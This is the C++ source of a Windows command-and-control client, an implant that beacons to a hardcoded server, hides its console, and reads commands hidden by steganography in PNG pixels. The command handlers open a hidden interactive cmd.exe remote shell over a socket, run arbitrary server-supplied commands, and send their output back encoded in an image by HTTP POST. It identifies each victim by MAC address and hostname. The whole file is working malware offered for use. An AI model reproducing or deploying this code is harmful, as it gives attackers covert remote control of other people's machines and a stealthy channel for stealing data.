// C2client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "client.h"
#include <wincodec.h>
#include <wincodecsdk.h>
#pragma comment(lib, "WindowsCodecs.lib")
#include <atlbase.h>
#include <atlcoll.h>
#include <iphlpapi.h>
#include <atlstr.h>
#pragma comment(lib, "iphlpapi.lib")

//Image Properties
typedef struct imageProps {
	UINT frameCount;		//Framecount (1 for PNGs, including this in now for future compatibility with other file formats)
	UINT width;				//width fo the image
	UINT height;			//Height of the image
	UINT stride;			//Stride of image
	GUID pixelFormat;	//Used to store the pixel format (Should be BGRA - 32bits)
}imageProps;



// To hide the console window I modified compiler settings as follows: Under linker set Subsystem to /SUBSYSTEM:windows  and Entry point to: mainCRTStartup
UINT GetStride(const UINT width, const UINT bitCount);
HRESULT readImage(CAtlArray<BYTE> *buffer, imageProps *props);
HRESULT writeImage(CAtlArray<BYTE>* buffer, imageProps* props);
HRESULT decodeCommands(std::string *commands, CAtlArray<BYTE>* buffer);
HRESULT encodeImage(std::string* data, CAtlArray<BYTE>* buffer);
int getID(std::string* ID);
size_t executeCommands(std::vector<std::string>* commands, client *context);
size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader);

//Struct Types for command
//Command sequence: <COM:TYPE-VALUE:TYPE-VALUE>....etc>

enum TYPE {
	KILL, //0-0
	CONF, //1-VAR-VAL
	GATH, //2-INF
	SHELL,//3-P (Port Number)
	EXEC, //4-COMMAND
	INIT, //5-0
};

//Global Variables
bool COInit = FALSE;				//COInit can only be initialized once
std::string ID;
unsigned long int beaconTime = 0;	//How often client beacans out to server
std::string hostname = "10.0.0.35";
std::string port = "8080";
std::string path = "/images/default.png";
std::wstring localPath;

int main()
{	
	CAtlArray<BYTE> buffer;					//Buffer to hold image
	imageProps props;						//Properties for image
	IPropertyBag2 *pBag;
	std::string commands;					//String to hold commands (Used to grab all encoded commands from image)
	std::vector<std::string> commandList;	//Vector to store each individual command
	HRESULT HR;								//Error handler for COM Objects
	/*Initialize Client*/
	//Initialize the COM library for use by the calling thread. This function must be called, and can only be called once from the same thread. 
	//pvReserved is reserved and must be NULL, COINT value is Apartment Threaded(Single Threaded COM Thread)
	if ((HR = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)) != S_OK) {
		OutputDebugStringA("Client: Unable to inititialize COM Library\n");
		exit(EXIT_FAILURE);
	}
	client clientC;
	//Initialize client (Only need to initialize WSA once)
	clientC.clientInit();
	localPath = clientC.filePath;

	//Get UNIQUE ID
	if (getID(&ID) == -1) {
		ID = "NULL";
	}
	//Loop Forever here
	while (true) {
		//Sleep (Initial sleep is 0)
		Sleep(beaconTime);
		//Connect to server
		if (clientC.clientConn(&clientC, hostname, port)) {
			continue;
		}
		//Send Get Request to C2
		if (clientC.sendRequest(&clientC, "GET " + path +  " HTTP/1.1")) {
			continue;
		}
		//Recieve respone
		if (clientC.recvResponse(&clientC)) {
			continue;
		}
		//Decode the image and get the commands

		if ((HR = readImage(&buffer, &props)) != S_OK) {
			buffer.RemoveAll();
			OutputDebugStringA("Server: Unable to decodeImage\n");
			continue;
		}
		if ((HR = decodeCommands(&commands, &buffer)) != S_OK) {
			buffer.RemoveAll();
			OutputDebugStringA("Server: Unable to decodeCommands\n");
			continue;
		}
		buffer.RemoveAll();
		//Parse Command header
		if (parseCommands(&commandList, commands) == -1) {
			OutputDebugStringA("Server: Unable to parse commands\n");
			//clear commands previously grabbed
			commandList.clear();
			commands = "";
			continue;
		}
		//Execute commangs grabbed
		executeCommands(&commandList, &clientC);
		//Clear Commands
		commands = "";
		commandList.clear();
			
			

		
	}

}


//Grab Encoded commands from Image
HRESULT readImage(CAtlArray<BYTE> *buffer, imageProps* props) {
	//Initialize Variables
	HRESULT hr;					//Error handling 
	//create a CComPtr Istream smart pointer for managing the COM interface
	CComPtr<IStream> stream;
	//Create a smart pointer gain acces to the decoder's properties
	CComPtr<IWICBitmapDecoder> decoder;
	//Smart pointer to gain access to interface that defines methods for decoding individual image frames
	CComPtr<IWICBitmapFrameDecode> frame;
	//Open file and retrieve a stream to read from the file
	if ((hr = SHCreateStreamOnFileEx(localPath.c_str(), STGM_READ, FILE_ATTRIBUTE_NORMAL, FALSE, NULL, &stream)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Create an instance of a COM object to the WICPNGDecoder interface
	if ((hr = decoder.CoCreateInstance(CLSID_WICPngDecoder)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Initialize the png decoder with the encoded png stream
	if ((hr = decoder->Initialize(stream, WICDecodeMetadataCacheOnDemand)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Grab the frame count
	if ((hr = decoder->GetFrameCount(&props->frameCount)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Get the frame
	if ((hr = decoder->GetFrame(0, &frame)) != S_OK) {
		stream.Release();
		return hr;
	}
	//From the frame determine the width and height
	if ((hr = frame->GetSize(&props->width, &props->height)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Grab the pixel format
	if ((hr = frame->GetPixelFormat(&props->pixelFormat)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Validate pixel format. This project only supports 32 bit BGRA PNG files at the moment.
	if (props->pixelFormat != GUID_WICPixelFormat32bppBGRA) {
		stream.Release();
		return hr;
	}
	//Get the stride
	props->stride = GetStride(props->width, 32);
	//A CAtlArray will be used to store the image data
	//Set the size of the array object to the size of the image
	buffer->SetCount(props->stride * props->height);
	//Copy the frame pixels to the CAtlArray buffer
	hr = frame->CopyPixels(0, props->stride, buffer->GetCount(), buffer->GetData());
	//Release the stream.
	stream.Release();
	return hr;
}//CComPtr auto releases underlying IErrorInfo interface
//Decode commands from image
HRESULT decodeCommands(std::string* commands, CAtlArray<BYTE>* buffer) {
	size_t commandL;			 //Size in bytes to parse
	std::string command;		//String to store encoded command
	//Grab Length of the command hidden int he pixel (In Bytes). It will always be the lease significant byte of the BGR value (3rd Byte)
	commandL = buffer->GetAt(2);
	//Iterate through the pixels and grab the least significant bytes of the BGR value (Since this is BGRA, we will be gabbing the red pixel value)
	for (int i = 1; i <= commandL;i++) {
		command += buffer->GetAt(i * 4 + 2);
	}
	*commands = command;
	return S_OK;
}
//Write encoded data to image file
HRESULT writeImage(CAtlArray<BYTE>* buffer, imageProps *props) {
	//Initialize Variables
	HRESULT hr;					//Error handling 
	//create a CComPtr Istream smart pointer for managing the COM interface
	CComPtr<IStream> stream;
	//Create a smart pointer gain acces to the decoder's properties
	CComPtr<IWICBitmapEncoder> encoder;
	//Smart pointer to gain access to interface that defines methods for decoding individual image frames
	CComPtr<IWICBitmapFrameEncode> frame;
	//
	IPropertyBag2* pPropertyBag = NULL;
	//Create stream from buffer
	if ((hr = SHCreateStreamOnFileEx(localPath.c_str(), STGM_WRITE | STGM_CREATE, FILE_ATTRIBUTE_NORMAL, FALSE, NULL, &stream)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Create an instance of a COM object to the WICPNG Encoder interface
	if ((hr = encoder.CoCreateInstance(CLSID_WICPngEncoder)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Initialize the png decoder with the encoded png stream
	if ((hr = encoder->Initialize(stream, WICBitmapEncoderNoCache)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Grab the frame count
	if ((hr = encoder->CreateNewFrame(&frame, &pPropertyBag)) != S_OK) {
		stream.Release();
		return hr;
	}
	if ((hr = frame->Initialize(pPropertyBag)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Set Frame properties
	if ((hr = frame->SetSize(props->width, props->height)) != S_OK) {
		stream.Release();
		return hr;
	}
	//
	if ((hr = frame->SetPixelFormat(&props->pixelFormat)) != S_OK) {
		stream.Release();
		return hr;
	}

	if ((hr = frame->WritePixels(props->height,props->stride, buffer->GetCount(), buffer->GetData())) != S_OK) {
		return hr;
	}

	if ((hr = frame->Commit()) != S_OK) {
		return hr;
	}
	if ((hr = encoder->Commit()) != S_OK){
		return hr;
	}
	return hr;
}//CComPtr auto releases underlying IErrorInfo interface
//Encode image with data
HRESULT encodeImage(std::string* data, CAtlArray<BYTE>* buffer) {

	size_t lsb = (byte)(data->length() & 0xFFu);
	size_t msb = (byte)((data->length() >> 8) & 0xFFu);
	buffer->SetAt(2, lsb);
	buffer->SetAt(6, msb);
	//Iterate through the pixels and set the value of the red pixel byte
	for (int i = 2; i-1 <= data->length();i++) {
		buffer->SetAt(i * 4 + 2,data->at(i-2));
	}
	return S_OK;
}
//Parse Command Header for all commands in the encoded message;
size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader) {
	int currentPos = 0;	//Tail
	int nextPos = 0;	//Head
	//Move to the first position of : (Indicates first command)
	currentPos = commandHeader.find_first_of(":");
	if (currentPos == std::string::npos) {
		return -1;
	}
	//Go through entire string, grab each command, and append them to the commandList
	while (currentPos != std::string::npos) {
		//Increment to position of the next command; We will use this to grab the entire string betweem currentPos and nextPos
		nextPos = commandHeader.find_first_of(":", currentPos + 1);
		//If nextPos = npos, this is the last command, grab it and break from loop
		if (nextPos == std::string::npos) {
			commandList->push_back(commandHeader.substr(currentPos + 1, commandHeader.length() - currentPos-2));
			break;
		} 
		commandList->push_back(commandHeader.substr(currentPos + 1, nextPos - currentPos - 1));
		currentPos = nextPos;
	}
	return 0;
}
//Execute Commands
size_t executeCommands(std::vector<std::string>* list, client* context) {
	std::string varName;
	std::string varValue;
	//Iterate through commands and call them (Will need parsing later);
	for (auto n : *list) {
		//Grab the ID to see if commands are meant for this client, or if we need to ignore them
		if (n == list->at(0)){
			if (n == ID || n == "ALL") {
				OutputDebugStringA("Commands are meant for this client\n");
				continue;
			}else{
				OutputDebugStringA("Commands not meant for this client\n");
				return -1;
			}
		}
		//Get Type and Value of each command
		int type = std::stoi(n.substr(0, n.find_first_of("-")));
		std::string value = n.substr(n.find_first_of('-') + 1, n.length());
		//Idnetify type of command
		switch (type) {
			//Case Kill: Cleanup artificats and kill program
			case KILL:
				exit(0);
				break;
			//Case CONF: Configure a global variabl (Such as beaconing sequence, the URL to reach out to, etc....
			case CONF:
			{
				//Grab var name
				varName = value.substr(0, value.find_first_of("-"));
				//Grab var value
				varValue = value.substr(value.find_first_of('-') + 1, value.length());
				if (varName == "hostname") {
					hostname = varValue;
				}
				if (varName == "path") {
					path = varValue;
				}
				else if (varName == "beacon") {
					beaconTime = atoi(varValue.c_str());
				}
				break;
			}
			//Establish a persistent connection to the server
			case SHELL:
			{
				//Connect to the server on the designated server
				if (context->clientConn(context, hostname, value) != 0) {
					OutputDebugStringA("Unable to connect to Server\n");
					break;
				}
				
				WCHAR ApplicationName[MAX_PATH];	//Buffer for application name (cmd.exe)
				STARTUPINFO si = { sizeof(si) };	//Startupinfo struct for process
				PROCESS_INFORMATION pi;					
				CString output = L"";				//Store output from commArg
				HANDLE hChildStdout_rd;				 //Used from parent process to Read output from ReadFile
				HANDLE hChildStdout_wt;				 //Used from child process to write output to pipe
				HANDLE hChildStdin_rd;				 //Used from parent process to Read output from ReadFile
				HANDLE hChildStdin_wt;				 //Used from child process to write output to pipe
				BOOL Status;						 //Status of Proccess/Pipe calls
				//Create Security Attributes for pipe
				SECURITY_ATTRIBUTES pipeSecAtt = { sizeof(SECURITY_ATTRIBUTES) };
				pipeSecAtt.bInheritHandle = TRUE;	//Chile proccess inherits pipe handle
				pipeSecAtt.lpSecurityDescriptor = NULL;
				
				//Create PIPE
				if (!::CreatePipe(&hChildStdout_rd, &hChildStdout_wt, &pipeSecAtt, 0)) {
					OutputDebugStringA("Unable to create pipe");
					break;
				}
				if (!::SetHandleInformation(hChildStdout_rd, HANDLE_FLAG_INHERIT, 0)) {
					break;
				}
				if (!::CreatePipe(&hChildStdin_rd, &hChildStdin_wt, &pipeSecAtt, 0)) {
					OutputDebugStringA("Unable to create pipe");
					break;
				}
				if (!::SetHandleInformation(hChildStdin_wt, HANDLE_FLAG_INHERIT, 0)) {
					break;
				}
				//Ensure structures are clear before setting attributes
				ZeroMemory(&si, sizeof(si));
				ZeroMemory(&pi, sizeof(pi));

				//Setup startup info attributes
				si.cb = sizeof(si);
				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //Required to set stdout and stdin
				si.hStdOutput = hChildStdout_wt;	//Requires STARTF_USESTDHANDLES in dwFlags
				si.hStdError = hChildStdout_wt;  //Requires STARTF_USESTDHANDLES in dwFlags
				si.hStdInput = hChildStdin_rd;
				si.wShowWindow = SW_HIDE;	//Hide window
				//Append command arguments provided from server
				//wValue.append(std::wstring(value.begin(), value.end()));

				//Create Process
				if (!::GetEnvironmentVariableW(L"ComSpec", ApplicationName, RTL_NUMBER_OF(ApplicationName))) {
					OutputDebugStringA("Error Creating Proccess\n");
				}
				if (!::CreateProcess(ApplicationName, 0, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi)) {
					OutputDebugStringA("Error Creating Proccess\n");
				}
			
				else {
					//Handles for child process no longer needed
					::CloseHandle(hChildStdout_wt);
					::CloseHandle(hChildStdin_rd);
					DWORD dRead, dWritten, statusValue;
					int bytesRecieved;
					DWORD bytesAvailable, bytesLeft;
					char end[] = "END$$";
					//Allocate memory for command buffer (To recieve from serveR) and output buffer (To send back to server)
					char* commandBuf;
					char* outBuf;
					commandBuf = (char*)malloc(sizeof(char) * 4096);
					outBuf = (char*)malloc(sizeof(char) * 4096);
					ZeroMemory(outBuf, 4096);
					ZeroMemory(commandBuf, 4096);
					::WaitForSingleObject(pi.hProcess, 100);
					if ((Status = ReadFile(hChildStdout_rd, outBuf, 4096, &dRead, nullptr)) == 0) {
						OutputDebugStringA("Client: Unable to write to process");
						closesocket(context->sock);
						free(commandBuf);
						free(outBuf);
						break;
					}
					//	output += CString(buff, dRead);
					if ((Status = send(context->sock, outBuf, dRead, 0)) == -1) {
						OutputDebugStringA("Client: Unable to write to process");
						closesocket(context->sock);
						free(commandBuf);
						free(outBuf);
						break;
					}
					//Status = ReadFile(hChildStdout_rd, buff, 4096, &dRead, nullptr);
					while (true) {
						//char command[] = "ipconfig\r\n";
						ZeroMemory(outBuf, 4096);
						ZeroMemory(commandBuf, 4096);
						if ((bytesRecieved = recv(context->sock, commandBuf, 4096, 0)) == -1) {
							OutputDebugStringA("Client: Did not recieve data from server");
							closesocket(context->sock);
							free(commandBuf);
							free(outBuf);
							break;
						}
						
						if ((Status = WriteFile(hChildStdin_wt, commandBuf, bytesRecieved, &dWritten, NULL)) == 0) {
							OutputDebugStringA("Client: Unable to write to process");
							closesocket(context->sock);
							free(commandBuf);
							free(outBuf);
							break;
						}
						//Check if data is ready for reading
						int command;
						while (true) {
							//Small sleep to give process time to output data
							Sleep(250);
							//Read from named pipe (STDOUT of child process)
							if ((Status = ReadFile(hChildStdout_rd, outBuf, 4096, &dRead, nullptr)) == 0) {
								OutputDebugStringA("Client: Unable to write to process");
								closesocket(context->sock);
								free(commandBuf);
								free(outBuf);
								break;
							}
							
							
							if (!strcmp(outBuf,commandBuf)) {
								ZeroMemory(outBuf, 4096);
								Sleep(5000);
								continue;
							}
							if ((Status = send(context->sock, outBuf, dRead, 0)) == -1) {
								OutputDebugStringA("Client: Unable to write to process");
								closesocket(context->sock);
								free(commandBuf);
								free(outBuf);
								break;
							}
							::PeekNamedPipe(hChildStdout_rd, NULL, NULL, NULL, &bytesAvailable,&bytesLeft);
							if (bytesAvailable == 0 && bytesLeft == 0) {
								send(context->sock, end,strlen(end),0);
								break;
							}

						}
	

						
					}
				
					//Close proccess/threads
				
					::CloseHandle(pi.hProcess);
					::CloseHandle(pi.hThread);
				}

				break;
			}
			//Execute a Command
			case EXEC:
			{
				std::wstring wValue;
				WCHAR* commArg;
				STARTUPINFO si = { sizeof(si) };
				PROCESS_INFORMATION pi;
				CString output = L"<DATA:";						 //Store output from commArg
				HANDLE hChildStdoutRd;				 //Used from parent process to Read output from ReadFile
				HANDLE hChildStdoutWr;				 //Used from child process to write output to pipe
				BOOL Status;						 //Status of Proccess/Pipe calls
				//Create Security Attributes for pipe
				SECURITY_ATTRIBUTES pipeSecAtt = { sizeof(SECURITY_ATTRIBUTES) };
				pipeSecAtt.bInheritHandle = TRUE;	//Chile proccess inherits pipe handle
				pipeSecAtt.lpSecurityDescriptor = NULL;

				//Create PIPE
				if (!::CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &pipeSecAtt, 0)) {
					OutputDebugStringA("Unable to create pipe");
					break;
				}
				ZeroMemory(&si, sizeof(si));
				ZeroMemory(&pi, sizeof(pi));
				//Set attributes of StartupInfo
				si.cb = sizeof(si);
				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //USESTDHandles to *
				si.hStdOutput = hChildStdoutWr;	//Requires STARTF_USESTDHANDLES in dwFlags
				si.hStdError = hChildStdoutWr;  //Requires STARTF_USESTDHANDLES in dwFlags
				si.wShowWindow = SW_HIDE;
				wValue = L"cmd.exe /c "; 				//Base cmd syntax
				//Append command arguments provided from server
				wValue.append(std::wstring(value.begin(), value.end()));
				//Convert command to a WCHAR * to pass into CreateProcess
				commArg = (WCHAR *)wValue.c_str();
				//Create Process
				if (!::CreateProcess(nullptr, commArg, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi)) {
					OutputDebugStringA("Error Creating Proccess\n");
				}
				else {
					//Wait for process to finish (Maximum 20 seconds)
					
					DWORD wt = ::WaitForSingleObject(pi.hProcess, 20000);
					if (wt == WAIT_TIMEOUT) {
						break;
						OutputDebugStringA("Unable to run command\n");
					}
					if (!::CloseHandle(hChildStdoutWr)) {
						OutputDebugStringA("Unable to close stdout handle\n");
						break;
					}
					DWORD dRead;
					CHAR buff[4096];
					while (ReadFile(hChildStdoutRd,buff,4096,&dRead,nullptr) > 0) {
						output += CString(buff, dRead);
					}
					//Close proccess/threads
					::CloseHandle(hChildStdoutRd);
					::CloseHandle(pi.hProcess);
					::CloseHandle(pi.hThread);
				}
				CAtlArray<BYTE> imageBuffers;
				imageProps propsS;
				//Convert CString to string
				CT2CA conv(output);
				std::string datas(conv);
				readImage(&imageBuffers, &propsS);
				encodeImage(&datas, &imageBuffers);
				writeImage(&imageBuffers, &propsS);

			    //Connect to server
				if(context->clientConn(context, hostname, port)) {
						continue;
				}
				//Send POST Request to C2
				if (context->sendPost(context)) {
					continue;
				}
				//Rcieve respone later
				closesocket(context->sock);
				break;
			}
			case INIT:
			{
				std::string init = "<INIT:";
				init.append(ID);
				init.append(">");
				CAtlArray<BYTE> imageBuffers;
				imageProps propsS;
				readImage(&imageBuffers, &propsS);
				encodeImage(&init, &imageBuffers);
				writeImage(&imageBuffers, &propsS);
				//Connect to server
				if (context->clientConn(context, hostname, port)) {
					continue;
				}
				//Send POST Request to C2
				if (context->sendPost(context)) {
					continue;
				}
				//Rcieve respone later
				closesocket(context->sock);
				break;
			}
		}
		//Call System Commands
	}
	return true;
}
//Get the stride of the image
UINT GetStride(const UINT width, const UINT bitCount) {
	const UINT byteCount = bitCount / 8;
	const UINT stride = (width * byteCount);
	return stride;
}

int getID(std::string* ID) {

	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
	char* mac_addr = (char*)malloc(18);
	//Allocate buffer for Adapter Info
	AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
	// Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(AdapterInfo);
		AdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		if (AdapterInfo->AddressLength < 6) {
			free(AdapterInfo);
			free(mac_addr);
			return -1;
		}
		sprintf_s(mac_addr,18, "%02X%02X%02X%02X%02X%02X",
			AdapterInfo->Address[0], AdapterInfo->Address[1],
			AdapterInfo->Address[2], AdapterInfo->Address[3],
			AdapterInfo->Address[4], AdapterInfo->Address[5]);
		*ID = mac_addr;
	}
	//Cleanup before getting hostname
	free(mac_addr);
	free(AdapterInfo);
	//Grab hostname
	char* hostname = (char*)malloc(sizeof(char) * 1024);
	if (gethostname(hostname, 1024) != 0) {
		free(hostname);
		return -1;
	}
	ID->append("-");
	*ID += hostname;
	free(hostname);
	return 0;
}